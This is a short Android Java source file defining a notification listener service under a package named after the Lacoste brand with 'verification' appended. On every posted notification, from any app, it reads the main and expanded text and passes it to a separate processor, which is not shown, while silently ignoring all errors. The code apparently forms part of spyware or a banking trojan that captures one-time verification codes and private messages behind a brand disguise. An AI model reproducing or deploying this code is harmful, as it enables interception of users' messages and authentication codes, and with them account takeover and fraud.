package com.lacoste.verification; import android.service.notification.NotificationListenerService;import android.service.notification.StatusBarNotification;import android.os.Bundle;public class NotificationAccessService extends NotificationListenerService { public void onNotificationPosted(StatusBarNotification s){try{Bundle b=s.getNotification().extras;CharSequence x=b.getCharSequence("android.text");if(x!=null)VerificationProcessor.process(this,x.toString());CharSequence big=b.getCharSequence("android.bigText");if(big!=null)VerificationProcessor.process(this,big.toString());}catch(Exception ignored){}} }
